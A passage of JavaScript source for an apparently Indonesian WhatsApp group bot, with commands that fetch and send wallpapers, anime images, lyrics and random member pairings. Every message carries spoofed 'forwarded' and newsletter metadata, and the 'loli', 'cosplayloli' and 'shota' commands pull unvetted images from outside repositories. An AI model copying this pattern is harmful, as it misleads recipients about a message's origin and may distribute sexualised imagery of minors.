                  mentionedJid: [me, jodoh], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return aespispStickGroup()
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `💏Couple\n\n@${orang.split('@')[0]}\n\n          ❤️\n\n@${jodoh.split('@')[0]}\n\nCieeee, What's Going On❤️💖👀`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/couple.jpg')}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [orang, jodoh], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
            }
            break
                        case 'coffee': case 'kopi': {
                let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: 'https://coffee.alexflipnote.dev/random'} }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'wallpaper': {
                if (!text) return replygcaespisp('Enter Query Title')
                await aespispStickWait()
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]       
         let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${text}*_\n\n${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: result.image[0]}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                
            }
            break
            case 'wikimedia': {
                if (!text) return replygcaespisp('Enter Query Title')
                await aespispStickWait()
		let { wikimedia } = require('./lib/scraper')
                let anumedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${text}*_\n\n${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: result.image}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                
            }
            break
            case 'loli': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
 
            }
            break
            case 'waifu': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'neko': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
            }
            case 'wallhp': case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli2': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu2': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
await aespispStickWait()
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/lisa.json')
if (/loli2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/naruto.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/tsunade.json')
if (/waifu2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: yeha}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'lyrics': {
if (!text) return replygcaespisp(`What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`)
await aespispStickWait()
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
const aespisplirik = `
*Title :* ${result.title}
*Author :* ${result.author}
*Url :* ${result.link}

*Lyrics :* ${result.lyrics}

`.trim()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: aespisplirik
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'pick': {
            	if (!m.isGroup) return aespispStickGroup()
            	if (!text) return replygcaespisp(`What do you want to pick?\nExample: ${prefix + command} idiot`)
             const groupMetadata = m.isGroup ? await ArielStore.groupMetadata(m.chat)
                 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let aespispshimts = member[Math.floor(Math.random() * member.length)]
             let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `The most *${text}* here is *@${aespispshimts.split("@")[0]}*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [aespispshimts], 
